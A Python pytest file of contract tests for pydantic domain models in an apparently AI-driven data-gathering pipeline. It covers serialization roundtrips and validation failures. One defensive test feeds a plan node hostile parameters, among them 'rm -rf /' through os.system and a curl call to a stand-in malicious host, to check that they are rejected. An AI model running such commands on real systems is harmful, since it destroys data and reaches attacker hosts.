"""Contract tests for domain model serialization, deserialization, and JSON schema validation."""

import json
from pathlib import Path

import pytest
from pydantic import ValidationError

from app.domain.contracts import (
    Claim,
    DatasetSchema,
    EvidenceAnchor,
    FieldSpec,
    PlanDAG,
    PlanNode,
    RequirementSpec,
    TrustContract,
)
from app.domain.enums import (
    EvidenceStatus,
    EvidenceType,
    FieldDataType,
    FieldOrigin,
    OperatorType,
)

FIXTURES_DIR = Path(__file__).parent.parent / "fixtures" / "contracts"


def load_fixture(filename: str) -> dict[str, object]:
    """Load JSON test fixture from disk."""
    path = FIXTURES_DIR / filename
    with open(path, encoding="utf-8") as f:
        return json.load(f)  # type: ignore[no-any-return]


def test_requirement_spec_roundtrip() -> None:
    """Test RequirementSpec model -> JSON -> model roundtrip and schema generation."""
    raw_data = load_fixture("requirement_spec.json")
    model = RequirementSpec.model_validate(raw_data)

    assert model.entity_type == "company"
    assert len(model.fields) == 6
    assert model.fields[0].key == "company_name"
    assert model.fields[0].origin == FieldOrigin.USER
    assert model.fields[4].key == "headquarters"
    assert model.fields[4].origin == FieldOrigin.AI_INFERRED

    # Model -> JSON -> Model
    dumped_json = model.model_dump_json()
    reloaded = RequirementSpec.model_validate_json(dumped_json)
    assert reloaded == model

    # JSON Schema generation
    schema = RequirementSpec.model_json_schema()
    assert schema["type"] == "object"
    assert "properties" in schema
    assert "fields" in schema["properties"]


def test_trust_contract_roundtrip() -> None:
    """Test TrustContract model -> JSON -> model roundtrip and schema generation."""
    raw_data = load_fixture("trust_contract.json")
    model = TrustContract.model_validate(raw_data)

    assert model.minimum_independent_sources == 2
    assert model.prefer_first_party is True
    assert model.max_pages == 60
    assert model.max_llm_calls == 80

    dumped_json = model.model_dump_json()
    reloaded = TrustContract.model_validate_json(dumped_json)
    assert reloaded == model

    schema = TrustContract.model_json_schema()
    assert schema["type"] == "object"
    assert "max_estimated_cost_usd" in schema["properties"]


def test_plan_dag_roundtrip() -> None:
    """Test PlanDAG model -> JSON -> model roundtrip and schema generation."""
    raw_data = load_fixture("plan_dag.json")
    model = PlanDAG.model_validate(raw_data)

    assert len(model.nodes) == 7
    assert model.nodes[0].operator == OperatorType.DISCOVER
    assert model.nodes[1].operator == OperatorType.FETCH_HTTP
    assert model.nodes[6].operator == OperatorType.MATERIALIZE

    dumped_json = model.model_dump_json()
    reloaded = PlanDAG.model_validate_json(dumped_json)
    assert reloaded == model

    schema = PlanDAG.model_json_schema()
    assert schema["type"] == "object"
    assert "nodes" in schema["properties"]


def test_claim_roundtrip() -> None:
    """Test Claim model -> JSON -> model roundtrip and schema generation."""
    raw_data = load_fixture("claim.json")
    model = Claim.model_validate(raw_data)

    assert model.entity_candidate_key == "sarvam_ai"
    assert model.field_key == "funding_amount"
    assert model.evidence.anchor_type == EvidenceType.TEXT_SPAN
    assert model.evidence.status == EvidenceStatus.EXACT
    assert model.evidence.verified is True

    dumped_json = model.model_dump_json()
    reloaded = Claim.model_validate_json(dumped_json)
    assert reloaded == model

    schema = Claim.model_json_schema()
    assert schema["type"] == "object"
    assert "evidence" in schema["properties"]


def test_dataset_schema_roundtrip() -> None:
    """Test DatasetSchema model -> JSON -> model roundtrip and schema generation."""
    raw_data = load_fixture("dataset_schema.json")
    model = DatasetSchema.model_validate(raw_data)

    assert model.entity_type == "company"
    assert len(model.fields) == 3
    assert model.schema_hash == "a1b2c3d4e5f67890"

    dumped_json = model.model_dump_json()
    reloaded = DatasetSchema.model_validate_json(dumped_json)
    assert reloaded == model

    schema = DatasetSchema.model_json_schema()
    assert schema["type"] == "object"
    assert "schema_hash" in schema["properties"]


# ==============================================================================
# Negative Validation Tests
# ==============================================================================


def test_field_spec_rejects_invalid_keys() -> None:
    """Verify FieldSpec rejects non-snake_case or malformed keys."""
    with pytest.raises(ValidationError):
        FieldSpec(key="Invalid-Key", label="Invalid", data_type=FieldDataType.TEXT)

    with pytest.raises(ValidationError):
        FieldSpec(key="123startwithnumber", label="Invalid", data_type=FieldDataType.TEXT)

    with pytest.raises(ValidationError):
        FieldSpec(key="has spaces", label="Invalid", data_type=FieldDataType.TEXT)


def test_plan_node_rejects_arbitrary_code_parameters() -> None:
    """Verify PlanNode strictly forbids params containing arbitrary code execution keys."""
    # Attempting to inject Python code
    with pytest.raises(ValidationError, match="Forbidden parameter 'python'"):
        PlanNode(
            id="exploit_01",
            operator=OperatorType.EXTRACT,
            params={"python": "import os; os.system('rm -rf /')"},
        )

    # Attempting to inject shell command
    with pytest.raises(ValidationError, match="Forbidden parameter 'command'"):
        PlanNode(
            id="exploit_02",
            operator=OperatorType.EXTRACT,
            params={"command": "curl http://malicious.com"},
        )

    # Attempting to inject arbitrary script
    with pytest.raises(ValidationError, match="Forbidden parameter 'script'"):
        PlanNode(
            id="exploit_03",
            operator=OperatorType.EXTRACT,
            params={"script": "eval(something)"},
        )


def test_plan_node_rejects_unknown_operators() -> None:
    """Verify PlanNode rejects operators not registered in OperatorType."""
    with pytest.raises(ValidationError):
        PlanNode(
            id="invalid_op_01",
            operator="EXECUTE_ARBITRARY_CODE",  # type: ignore[arg-type]
            params={},
        )


def test_evidence_anchor_rejects_inverted_span() -> None:
    """Verify EvidenceAnchor rejects char_end < char_start."""
    with pytest.raises(ValidationError, match="char_end cannot be less than char_start"):
        EvidenceAnchor(
            anchor_type=EvidenceType.TEXT_SPAN,
            status=EvidenceStatus.EXACT,
            quote="example quote",
            char_start=500,
            char_end=400,
        )


def test_trust_contract_rejects_negative_budget() -> None:
    """Verify TrustContract rejects negative page/call limits."""
    with pytest.raises(ValidationError):
        TrustContract(max_pages=-10)

    with pytest.raises(ValidationError):
        TrustContract(minimum_independent_sources=0)  # ge=1
